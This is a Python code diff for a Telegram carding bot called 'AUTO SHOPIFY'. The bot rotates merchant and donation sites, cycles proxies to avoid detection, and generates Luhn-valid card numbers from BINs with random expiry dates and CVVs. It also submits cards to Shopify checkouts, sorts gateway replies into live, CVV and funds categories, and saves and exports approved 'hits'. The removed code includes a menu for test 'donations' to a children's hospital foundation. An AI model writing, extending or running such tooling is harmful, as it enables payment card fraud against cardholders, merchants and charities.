+        if sqlite_backup.is_permanent_site(url):
+            continue
+        should_remove = False
+        if url in site_stats:
+            total, success = site_stats[url]
+            if total >= SITE_MIN_CHECKS:
+                fail_rate = 1 - (success / total)
+                if fail_rate >= SITE_FAIL_RATE_THRESHOLD:
+                    should_remove = True
+                    print(f"🧹 Auto-cleaned dead site: {url} (fail rate: {fail_rate:.0%})")
+        if should_remove:
+            alive, status_code, _ = check_site_alive(url, timeout=3)
+            if not alive:
+                sites.remove(url)
+                removed.append(url)
+                if url in site_stats:
+                    del site_stats[url]
+            else:
+                if url in site_stats:
+                    site_stats[url] = (0, 0)
+                print(f"🔄 Site {url} still alive (HTTP {status_code}), stats reset")
+    if removed:
+        save_sites(sites)
+        print(f"🧹 Auto-maintenance: removed {len(removed)} dead sites")
 
-# ================== SUBMENÚ DONATE ==================
-async def show_donate_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "❤️ *DONACIONES GIVEWP*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        "Sydney Children's Hospital Foundation\n\n"
-        "Comandos:\n"
-        "/donate5  - Donar $5\n"
-        "/donate10 - Donar $10\n"
-        "/donate20 - Donar $20\n"
-        "/donate [monto] [nro_tarjeta] - Cantidad personalizada"
-    )
+def report_site_result(url, success, response_status=None, card_category=None, response_msg=None):
+    if not url:
+        return
     
-    keyboard = [
-        [InlineKeyboardButton("💳 DONAR $5", callback_data="donate_5")],
-        [InlineKeyboardButton("💳 DONAR $10", callback_data="donate_10")],
-        [InlineKeyboardButton("💳 DONAR $20", callback_data="donate_20")],
-        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-    ]
+    track_site_performance(url, success is True)
+    auto_clean_dead_sites()
     
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+    # Smart site filter: check response message
+    resp_lower = (response_msg or '').lower()
+    
+    # APPROVED / CHARGE → mark as permanent
+    if card_category in ['CHARGE', '3DS', 'CVV', 'FUNDS', 'LIVE']:
+        if not sqlite_backup.is_permanent_site(url):
+            sqlite_backup.add_permanent_site(url)
+            print(f"🏆 Sitio PERMANENTE (APPROVED - {card_category}): {url}")
+        else:
+            sqlite_backup.add_permanent_site(url)
+        return
+    
+    if sqlite_backup.is_permanent_site(url):
+        print(f"🔒 Sitio PERMANENTE protegido: {url}")
+        return
+    
+    # DECLINED → site is responding correctly, keep it
+    if card_category == 'DECLINED':
+        print(f"✅ Sitio ACTIVO (DECLINED = responde correctamente): {url}")
+        return
+    
+    # "site dead 06" or "unknown" → auto-delete site
+    if card_category == 'UNKNOWN' or 'site dead' in resp_lower or 'unknown' in resp_lower:
+        sites = load_sites()
+        if url in sites:
+            sites.remove(url)
+            save_sites(sites)
+            print(f"❌ Sitio ELIMINADO ({card_category}): {url}")
+        return
 
-# ================== SUBMENÚ CHECK CARD ==================
-async def show_check_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "💳 *CHECK SHOPIFY*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        "Envía una tarjeta en formato:\n"
-        "`NUMBER|MES|AÑO|CVV`\n\n"
-        "Ejemplo:\n"
-        "`4377110010309114|08|2026|501`"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+# ============================================
+# PROXIES MANAGEMENT
+# ============================================
 
-# ================== SUBMENÚ MASS CHECK ==================
-async def show_mass_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    
-    cards_count = len(user_data["cards"])
-    sites_count = len(user_data["sites"])
-    proxies_count = len(user_data["proxies"])
-    
-    text = (
-        "📦 *MASS CHECK SHOPIFY*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        f"• Cards: {cards_count}\n"
-        f"• Sites: {sites_count}\n"
-        f"• Proxies: {proxies_count}\n\n"
-        "Usa /mass para iniciar"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+def load_proxies():
+    return safe_json_load(PROXIES_FILE, [])
 
-# ================== SUBMENÚ SITES ==================
-async def show_sites_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    sites = user_data["sites"]
-    
-    text = (
-        "🌐 *SITES MANAGER*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        f"Total sites: `{len(sites)}`\n\n"
-        "Envía URLs para agregar"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+def save_proxies(proxies):
+    return safe_json_save(PROXIES_FILE, proxies)
 
-# ================== SUBMENÚ PROXIES ==================
-async def show_proxies_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    proxies = user_data["proxies"]
-    
-    text = (
-        "🔌 *PROXIES MANAGER*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        f"Total proxies: `{len(proxies)}`\n\n"
-        "Envía proxies en formato ip:puerto o ip:puerto:user:pass\n"
-        "Ejemplo: `/addproxy 23.26.53.37:6003:user:pass`"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+def validate_proxy_format(proxy_str):
+    if not proxy_str or not isinstance(proxy_str, str):
+        return False, "Empty proxy"
+    proxy_str = proxy_str.strip()
+    parts = proxy_str.split(':')
+    if len(parts) not in [2, 4]:
+        return False, "Format must be HOST:PORT or HOST:PORT:USER:PASS"
+    host = parts[0]
+    port_str = parts[1]
+    # Accept both IP addresses and hostnames
+    ip_pattern = re.compile(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$')
+    hostname_pattern = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')
+    ip_match = ip_pattern.match(host)
+    if ip_match:
+        for octet in ip_match.groups():
+            if int(octet) > 255:
+                return False, f"Invalid IP octet: {octet}"
+    elif not hostname_pattern.match(host):
+        return False, f"Invalid host: {host}"
+    try:
+        port = int(port_str)
+        if port < 1 or port > 65535:
+            return False, f"Invalid port: {port}"
+    except ValueError:
+        return False, f"Port not a number: {port_str}"
+    return True, "OK"
 
-# ================== SUBMENÚ CARDS ==================
-async def show_cards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = await user_manager.get_user_data(user_id)
-    cards = user_data["cards"]
-    
-    text = (
-        "🧾 *CARDS MANAGER*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        f"Total cards: `{len(cards)}`\n\n"
-        "Sube archivo .txt con tarjetas"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+def normalize_proxy(proxy_str):
+    proxy_str = proxy_str.strip()
+    proxy_str = re.sub(r'\s+', '', proxy_str)
+    return proxy_str
 
-# ================== SUBMENÚ STATS ==================
-async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    stats = await db.get_stats(user_id)
-    
-    text = (
-        f"📊 *ESTADÍSTICAS*\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"*SHOPIFY:*\n"
-        f"✅ Charged: {stats['charged']}\n"
-        f"❌ Declined: {stats['declined']}\n\n"
-        f"*STRIPE:*\n"
-        f"✅ LIVE: {stats['stripe_live']}\n"
-        f"❌ DECLINED: {stats['stripe_declined']}\n"
-        f"🚨 FRAUDULENT: {stats['stripe_fraud']}\n"
-        f"🔒 3DS: {stats['stripe_3ds']}"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    if update.callback_query:
-        await update.callback_query.edit_message_text(
-            text, parse_mode="Markdown", reply_markup=reply_markup
-        )
+def add_proxy(proxy_str):
+    proxy_str = normalize_proxy(proxy_str)
+    valid, reason = validate_proxy_format(proxy_str)
+    if not valid:
+        return False
+    proxies = load_proxies()
+    if proxy_str not in proxies:
+        proxies.append(proxy_str)
+        save_proxies(proxies)
+        return True
+    return False
+
+def clear_all_proxies():
+    save_proxies([])
+    return True
+
+def delete_proxy_by_index(index):
+    proxies = load_proxies()
+    if 1 <= index <= len(proxies):
+        removed = proxies.pop(index - 1)
+        save_proxies(proxies)
+        return removed
+    return None
+
+def delete_dead_proxies(dead_proxies):
+    proxies = load_proxies()
+    for dead in dead_proxies:
+        if dead in proxies:
+            proxies.remove(dead)
+    save_proxies(proxies)
+    return len(dead_proxies)
+
+def get_random_proxy():
+    proxies = load_proxies()
+    if not proxies:
+        return None
+    now = time.time()
+    available = []
+    for p in proxies:
+        if p in failed_proxies:
+            fails, last_fail = failed_proxies[p]
+            if fails >= PROXY_FAIL_THRESHOLD and (now - last_fail) < PROXY_FAIL_COOLDOWN:
+                continue
+            elif (now - last_fail) >= PROXY_FAIL_COOLDOWN:
+                del failed_proxies[p]
+        available.append(p)
+    if not available:
+        failed_proxies.clear()
+        available = proxies
+    return random.choice(available)
+
+def report_proxy_failure(proxy_str):
+    """Track proxy failures for auto-rotation"""
+    if not proxy_str:
+        return
+    now = time.time()
+    if proxy_str in failed_proxies:
+        fails, _ = failed_proxies[proxy_str]
+        failed_proxies[proxy_str] = (fails + 1, now)
     else:
-        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)
+        failed_proxies[proxy_str] = (1, now)
 
-# ================== SUBMENÚ SETTINGS ==================
-async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "⚙️ *SETTINGS*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        f"Workers: {Settings.MAX_WORKERS_PER_USER}\n"
-        f"Rate limit: {Settings.RATE_LIMIT_SECONDS}s\n"
-        f"Daily limit: {Settings.DAILY_LIMIT_CHECKS}\n"
-        f"Stripe Auth: ${Settings.STRIPE_AUTH_AMOUNT}\n"
-        f"Card timeout: {Settings.STRIPE_CARD_TIMEOUT}s"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+def report_proxy_success(proxy_str):
+    """Clear failure count on success"""
+    if proxy_str and proxy_str in failed_proxies:
+        del failed_proxies[proxy_str]
 
-# ================== SUBMENÚ ANALYZER ==================
-async def show_analyzer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "🔍 *HERRAMIENTA DE ANÁLISIS*\n"
-        "━━━━━━━━━━━━━━━━━━\n\n"
-        "Analiza sitios web para detectar CAPTCHA:\n\n"
-        "• `/analyze <url>` - Analizar un sitio\n"
-        "• `/findsites` - Ver sitios recomendados\n\n"
-        "Ejemplo:\n"
-        "`/analyze https://donate.schf.org.au`"
-    )
-    
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        text, parse_mode="Markdown", reply_markup=reply_markup
-    )
+# ============================================
+# PROXY CHECKER
+# ============================================
 
-# ================== FUNCIÓN DONATE ==================
-async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+proxy_latency = {}
+
+def check_proxy_socket(proxy_str):
+    """Level 1: TCP socket connection test with latency"""
+    try:
+        valid, reason = validate_proxy_format(proxy_str)
+        if not valid:
+            return False
+        parts = proxy_str.split(':')
+        host = parts[0]
+        port = int(parts[1])
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(PROXY_SOCKET_TIMEOUT)
+        start = time.time()
+        result = sock.connect_ex((host, port))
+        latency = round((time.time() - start) * 1000)
+        sock.close()
+        if result == 0:
+            proxy_latency[proxy_str] = latency
+            return True
+        return False
+    except:
+        pass
+    return False
+
+def check_proxy_http_connect(proxy_str):
+    """Level 2: HTTP CONNECT tunnel test"""
+    try:
+        parts = proxy_str.split(':')
+        if len(parts) < 2:
+            return False
+        host = parts[0]
+        port = int(parts[1])
+        proxy_url = f"http://{host}:{port}"
+        if len(parts) >= 4:
+            proxy_url = f"http://{parts[2]}:{parts[3]}@{host}:{port}"
+        proxies_dict = {'http': proxy_url, 'https': proxy_url}
+        resp = requests.get('http://httpbin.org/ip', proxies=proxies_dict, timeout=PROXY_CHECK_TIMEOUT + 2, verify=False)
+        return resp.status_code == 200
+    except:
+        return False
+
+def check_proxy_full(proxy_str):
+    """Level 3: Full proxy verification with real HTTP request"""
+    try:
+        parts = proxy_str.split(':')
+        if len(parts) < 2:
+            return False
+        host = parts[0]
+        port = int(parts[1])
+        proxy_url = f"http://{host}:{port}"
+        if len(parts) >= 4:
+            proxy_url = f"http://{parts[2]}:{parts[3]}@{host}:{port}"
+        proxies_dict = {'http': proxy_url, 'https': proxy_url}
+        resp = requests.get('https://www.google.com', proxies=proxies_dict, timeout=PROXY_CHECK_TIMEOUT + 3, verify=False)
+        return resp.status_code == 200
+    except:
+        return False
+
+def check_proxy_deep(proxy_str):
+    """Deep proxy check: format + socket + HTTP CONNECT + real request"""
+    valid, reason = validate_proxy_format(proxy_str)
+    if not valid:
+        return False, f'FORMAT_FAIL: {reason}'
+    if not check_proxy_socket(proxy_str):
+        return False, 'SOCKET_FAIL'
+    if not check_proxy_http_connect(proxy_str):
+        return False, 'HTTP_FAIL'
+    if not check_proxy_full(proxy_str):
+        return False, 'REQUEST_FAIL'
+    return True, 'ALL_PASS'
+
+def verify_proxy_batch(proxies, max_workers=PROXY_CHECK_WORKERS, deep=False):
+    alive = []
+    dead = []
+    reasons = {}
+    check_fn = check_proxy_deep if deep else check_proxy_socket
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {executor.submit(check_fn, p): p for p in proxies}
+        for future in as_completed(futures):
+            proxy = futures[future]
+            try:
+                result = future.result(timeout=PROXY_CHECK_TIMEOUT + 5)
+                if deep:
+                    is_alive, reason = result
+                    if is_alive:
+                        alive.append(proxy)
+                    else:
+                        dead.append(proxy)
+                        reasons[proxy] = reason
+                else:
+                    if result:
+                        alive.append(proxy)
+                    else:
+                        dead.append(proxy)
+                        reasons[proxy] = 'SOCKET_FAIL'
+            except:
+                dead.append(proxy)
+                reasons[proxy] = 'TIMEOUT'
+    return alive, dead, reasons
+
+def silent_proxy_check():
+    proxies = load_proxies()
+    if not proxies:
+        return
+    alive, dead, _ = verify_proxy_batch(proxies)
+    if dead:
+        delete_dead_proxies(dead)
+        print(f"🧹 Silent proxy check: removed {len(dead)} dead proxies, {len(alive)} alive")
+
+def start_silent_pc():
+    global silent_pc_running, silent_pc_thread
+    def run_silent_pc():
+        global silent_pc_running
+        while silent_pc_running:
+            try:
+                silent_proxy_check()
+            except:
+                pass
+            for _ in range(SILENT_PC_INTERVAL):
+                if not silent_pc_running:
+                    break
+                time.sleep(1)
+    if not silent_pc_running:
+        silent_pc_running = True
+        silent_pc_thread = threading.Thread(target=run_silent_pc, daemon=True)
+        silent_pc_thread.start()
+
+# ============================================
+# LUHN ALGORITHM & CARD GENERATOR
+# ============================================
+
+def luhn_checksum(card_number):
+    """Calculate Luhn checksum digit"""
+    digits = [int(d) for d in str(card_number)]
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    total = sum(odd_digits)
+    for d in even_digits:
+        total += sum(divmod(d * 2, 10))
+    return total % 10
+
+def generate_luhn_card(bin_prefix, length=16):
+    """Generate a valid card number from BIN using Luhn algorithm"""
+    bin_str = str(bin_prefix)
+    remaining = length - len(bin_str) - 1
+    partial = bin_str + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
+    for check_digit in range(10):
+        candidate = partial + str(check_digit)
+        if luhn_checksum(candidate) == 0:
+            return candidate
+    return partial + '0'
+
+def generate_cards_from_bin(bin_prefix, count=10):
+    """Generate multiple valid cards with random expiry and CVV"""
+    cards = []
+    now = datetime.now()
+    seen = set()
+    attempts = 0
+    while len(cards) < count and attempts < count * 3:
+        attempts += 1
+        cc = generate_luhn_card(bin_prefix)
+        if cc in seen:
+            continue
+        seen.add(cc)
+        month = random.randint(1, 12)
+        year = random.randint(now.year + 1, now.year + 5) % 100
+        cvv = random.randint(100, 999)
+        cards.append(f"{cc}|{month:02d}|{year:02d}|{cvv}")
+    return cards
+
+# ============================================
+# BIN LOOKUP
+# ============================================
+
+def bin_lookup(bin_number):
+    if CACHE_BIN_RESULTS and bin_number in bin_cache:
+        data, timestamp = bin_cache[bin_number]
+        if time.time() - timestamp < bin_cache_expiry:
+            return data
     
-    is_callback = update.callback_query is not None
-    message = update.message if not is_callback else update.callback_query.message
+    for lookup_fn in [_bin_lookup_binlist, _bin_lookup_handyapi, _bin_lookup_bincodes, _bin_lookup_bincheck]:
+        result = lookup_fn(bin_number)
+        if result:
+            if CACHE_BIN_RESULTS:
+                bin_cache[bin_number] = (result, time.time())
+            return result
+    return None
+
+def _bin_lookup_binlist(bin_number):
+    try:
+        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10,
+                               headers={'Accept-Version': '3'})
+        if response.status_code == 200:
+            data = response.json()
+            scheme = data.get('scheme', 'UNKNOWN').upper()
+            brand = data.get('brand', '').upper()
+            type_card = data.get('type', 'UNKNOWN').upper()
+            prepaid = data.get('prepaid', False)
+            bank = data.get('bank', {})
+            bank_name = bank.get('name', 'UNKNOWN')
+            country = data.get('country', {})
+            country_name = country.get('name', 'UNKNOWN')
+            country_code = country.get('alpha2', 'XX')
+            
+            flag = COUNTRY_FLAGS.get(country_code, '🌍')
+            
+            card_type = "PREPAID" if prepaid else type_card if type_card != 'UNKNOWN' else "CREDIT/DEBIT"
+            return {
+                'info': f"{card_type} - {scheme} {brand}".strip(),
+                'brand': scheme if scheme else (brand if brand else 'UNKNOWN'),
+                'type': card_type,
+                'level': brand if brand and brand != scheme else '',
+                'bank': bank_name,
+                'country': f"{country_name} {flag}",
+                'flag': flag,
+                'country_code': country_code
+            }
+    except:
+        pass
+    return None
+
+def _bin_lookup_handyapi(bin_number):
+    try:
+        response = requests.get(f"https://data.handyapi.com/bin/{bin_number}", timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('Status') == 'SUCCESS':
+                scheme = data.get('Scheme', 'UNKNOWN').upper()
+                card_type = data.get('Type', 'UNKNOWN').upper()
+                bank_name = data.get('Issuer', 'UNKNOWN')
+                country_name = data.get('Country', {}).get('Name', 'UNKNOWN') if isinstance(data.get('Country'), dict) else data.get('CountryName', 'UNKNOWN')
+                country_code = data.get('Country', {}).get('A2', 'XX') if isinstance(data.get('Country'), dict) else 'XX'
+                
+                flag = COUNTRY_FLAGS.get(country_code, '🌍')
+                
+                return {
+                    'info': f"{card_type} - {scheme}".strip(),
+                    'brand': scheme if scheme else 'UNKNOWN',
+                    'type': card_type if card_type != 'UNKNOWN' else 'CREDIT/DEBIT',
+                    'level': '',
+                    'bank': bank_name,
+                    'country': f"{country_name} {flag}",
+                    'flag': flag,
+                    'country_code': country_code
+                }
+    except:
+        pass
+    return None
+
+def _bin_lookup_bincodes(bin_number):
+    try:
+        response = requests.get(f"https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin_number}", timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('bin'):
+                scheme = data.get('card', 'UNKNOWN').upper()
+                card_type = data.get('type', 'UNKNOWN').upper()
+                level = data.get('level', '').upper()
+                bank_name = data.get('bank', 'UNKNOWN')
+                country_name = data.get('countryname', 'UNKNOWN')
+                country_code = data.get('country', 'XX').upper()
+                
+                flag = COUNTRY_FLAGS.get(country_code, '🌍')
+                
+                return {
+                    'info': f"{card_type} - {scheme} {level}".strip(),
+                    'brand': scheme if scheme else 'UNKNOWN',
+                    'type': card_type if card_type != 'UNKNOWN' else 'CREDIT/DEBIT',
+                    'level': level,
+                    'bank': bank_name,
+                    'country': f"{country_name} {flag}",
+                    'flag': flag,
+                    'country_code': country_code
+                }
+    except:
+        pass
+    return None
+
+def _bin_lookup_bincheck(bin_number):
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+        }
+        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10, headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('bin'):
+                scheme = data.get('brand', 'UNKNOWN').upper()
+                card_type = data.get('type', 'UNKNOWN').upper()
+                level = data.get('level', '').upper()
+                bank_name = data.get('bank', 'UNKNOWN')
+                country_name = data.get('country_name', 'UNKNOWN')
+                country_code = data.get('country', 'XX').upper()
+                prepaid = data.get('prepaid', False)
+                
+                flag = COUNTRY_FLAGS.get(country_code, '🌍')
+                
+                if prepaid:
+                    card_type = 'PREPAID'
+                
+                return {
+                    'info': f"{card_type} - {scheme} {level}".strip(),
+                    'brand': scheme if scheme else 'UNKNOWN',
+                    'type': card_type if card_type != 'UNKNOWN' else 'CREDIT/DEBIT',
+                    'level': level,
+                    'bank': bank_name,
+                    'country': f"{country_name} {flag}",
+                    'flag': flag,
+                    'country_code': country_code
+                }
+    except:
+        pass
+    return None
+
+# ============================================
+# SHOPIFY CARD CHECKER
+# ============================================
+
+def check_card_shopify(cc, month, year, cvv):
+    site = get_random_site()
+    proxy = get_random_proxy()
     
-    user_data = await user_manager.get_user_data(user_id)
-    cards = user_data.get("cards", [])
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    api_url = f"{API_URL}/?cc={card_str}"
     
+    if site:
+        api_url += f"&url={site}"
+    if proxy:
+        api_url += f"&proxy={proxy}"
+    
+    start_time = time.time()
+    site_used = site
+    
+    try:
+        proxies_dict = None
+        if proxy:
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) >= 2:
+                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
+                if len(proxy_parts) >= 4:
+                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+                proxies_dict = {'http': proxy_url, 'https': proxy_url}
+        
+        response = http_session.get(api_url, proxies=proxies_dict, timeout=REQUEST_TIMEOUT, verify=False)
+        elapsed = time.time() - start_time
+        
+        if response.status_code == 200:
+            result_text = response.text
+            try:
+                data = response.json()
+                response_msg = data.get('Response', 'UNKNOWN')
+                price = data.get('Price', '$0.95')
+                gateway = data.get('Gate', 'Shopify Payments')
+                site_used = data.get('Site', site)
+                category, status_msg = classify_response(response_msg)
+                
+                if site:
+                    report_site_result(site, True, response.status_code, category, response_msg=response_msg)
+                if proxy:
+                    report_proxy_success(proxy)
+                
+                return category, status_msg, response_msg, price, gateway, round(elapsed, 2), site_used
+            except:
+                category, status_msg = classify_response(result_text)
+                if site:
+                    report_site_result(site, True, response.status_code, category, response_msg=result_text)
+                if proxy:
+                    report_proxy_success(proxy)
+                return category, status_msg, result_text, "$0.95", "Shopify Payments", round(elapsed, 2), site
+        else:
+            if site:
+                report_site_result(site, False, response.status_code, 'ERROR')
+            return "ERROR", f"HTTP {response.status_code}", "", "$0.95", "Shopify Payments", round(elapsed, 2), site
+    except requests.exceptions.Timeout:
+        if proxy:
+            report_proxy_failure(proxy)
+        if site:
+            report_site_result(site, False, None, 'TIMEOUT')
+        return "ERROR", "TIMEOUT", "", "$0.95", "Shopify Payments", 0, site
+    except Exception as e:
+        if proxy:
+            report_proxy_failure(proxy)
+        if site:
+            report_site_result(site, False, None, 'ERROR')
+        return "ERROR", str(e)[:50], "", "$0.95", "Shopify Payments", 0, site
+
+def classify_response(response_msg):
+    response_upper = response_msg.upper() if response_msg else ""
+    
+    # CHARGE / APPROVED / ORDER COMPLETE
+    if any(kw in response_upper for kw in ['CHARGED', 'CAPTURED', 'APPROVED', 'SUCCESS', 'SUCCEEDED', 'PAID', 
+                                            'PAYMENT_INTENT_UNEXPECTED_STATE', 'ORDER_COMPLETE', 'ORDER COMPLETE',
+                                            'ORDER_PLACED', 'ORDER PLACED']):
+        return "CHARGE", response_msg
+    
+    # 3DS / Authentication Required (requires_action is treated as DECLINED)
+    if any(kw in response_upper for kw in ['3DS', '3D_SECURE', 'THREE_D_SECURE', 'AUTHENTICATION_REQUIRED', 
+                                            'REDIRECT', 'ENROLLED', 'SCA_REQUIRED']):
+        return "3DS", response_msg
+    
+    # Requires Action (treated as declined, not live)
+    if 'REQUIRES_ACTION' in response_upper:
+        return "DECLINED", response_msg
+    
+    # CVV/CVC incorrect (card is live)
+    if any(kw in response_upper for kw in ['CVV', 'CVC', 'INCORRECT_CVC', 'SECURITY_CODE', 
+                                            'INVALID_CVC', 'CVC_CHECK_FAILED']):
+        return "CVV", response_msg
+    
+    # Insufficient funds (card is live)
+    if any(kw in response_upper for kw in ['INSUFFICIENT', 'FUNDS', 'INSUFFICIENT_FUNDS', 
+                                            'NOT_ENOUGH', 'BALANCE']):
+        return "FUNDS", response_msg
+    
+    # Declined reasons
+    if any(kw in response_upper for kw in ['DECLINED', 'DECLINE', 'CARD_DECLINED', 'DO_NOT_HONOR',
+                                            'GENERIC_DECLINE', 'RESTRICTED', 'LOST', 'STOLEN',
+                                            'PICKUP', 'FRAUD', 'FRAUDULENT', 'RISK',
+                                            'EXPIRED', 'EXPIRED_CARD', 'INVALID_EXPIRY',
+                                            'INVALID_NUMBER', 'INCORRECT_NUMBER',
+                                            'PROCESSING_ERROR', 'CARD_NOT_SUPPORTED',
+                                            'INVALID_ACCOUNT', 'EXCEEDS_LIMIT',
+                                            'OTP', 'NOT_PERMITTED', 'REVOCATION',
+                                            'BLOCKED', 'CURRENCY_NOT_SUPPORTED',
+                                            'TRANSACTION_NOT_ALLOWED', 'DO NOT TRY AGAIN',
+                                            'REFER_TO_ISSUER', 'ISSUER_NOT_AVAILABLE',
+                                            'TRY_AGAIN_LATER', 'WITHDRAW', 'NO_ACTION_TAKEN',
+                                            'REENTER_TRANSACTION', 'INVALID_PIN']):
+        return "DECLINED", response_msg
+    
+    return "UNKNOWN", response_msg
+
+# ============================================
+# HITS MANAGEMENT (SHOPIFY)
+# ============================================
+
+def save_hit(hit_data):
+    hits = load_hits()
+    hits.append(hit_data)
+    safe_json_save(HITS_FILE, hits)
+    global hits_list
+    hits_list.append(hit_data)
+    try:
+        sqlite_backup.save_hit_backup(hit_data, "shopify")
+    except:
+        pass
+
+def load_hits():
+    return safe_json_load(HITS_FILE, [])
+
+def clear_hits():
+    global hits_list
+    hits_list = []
+    safe_json_save(HITS_FILE, [])
+
+def get_hits():
+    global hits_list
+    if not hits_list:
+        hits_list = load_hits()
+    return hits_list
+
+def export_hits_txt():
+    hits = get_hits()
+    if not hits:
+        return None
+    
+    content = "\u2550" * 50 + "\n"
+    content += f"  \U0001f6d2 AUTO SHOPIFY {BOT_VERSION} - APPROVED CARDS (HITS)\n"
+    content += f"  \U0001f4c5 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    content += "\u2550" * 50 + "\n\n"
+    
+    for i, hit in enumerate(hits, 1):
+        content += f"\u2501\u2501 [{i}] {hit.get('category', 'UNKNOWN')} \u2501\u2501\n"
+        content += f"  \U0001f4b3 CC: {hit.get('cc', '')}|{hit.get('month', '')}|{hit.get('year', '')}|{hit.get('cvv', '')}\n"
+        content += f"  \U0001f4dd Response: {hit.get('status_msg', '')}\n"
+        content += f"  \U0001f4b2 Price: {hit.get('price', '$0.95')}\n"
+        content += f"  \U0001f310 Gateway: {hit.get('gateway', 'Shopify Payments')}\n"
+        content += f"  \u23f1 Time: {hit.get('elapsed', 0)}s\n"
+        if hit.get('bin_info'):
+            content += f"  \U0001f3e6 BIN: {hit.get('bin_info', {}).get('info', '')}\n"
+            content += f"  \U0001f3e6 Bank: {hit.get('bin_info', {}).get('bank', '')}\n"
+            content += f"  \U0001f30d Country: {hit.get('bin_info', {}).get('country', '')}\n"
+        content += "\u2504" * 40 + "\n\n"
+    
+    content += "\u2550" * 50 + "\n"
+    content += f"  \U0001f3c6 TOTAL HITS: {len(hits)}\n"
+    content += "\u2550" * 50 + "\n"
+    
+    return content
+
+# ============================================
+# UI/UX CONSTANTS & HELPERS
+# ============================================
+
+BOT_VERSION = "v12.0"
+BOT_NAME = "AUTO SHOPIFY"
+
+# Decorative elements
+LINE_TOP = "╔══════════════════════════════╗"
+LINE_BOT = "╚══════════════════════════════╝"
+LINE_MID = "╠══════════════════════════════╣"
+LINE_THIN = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
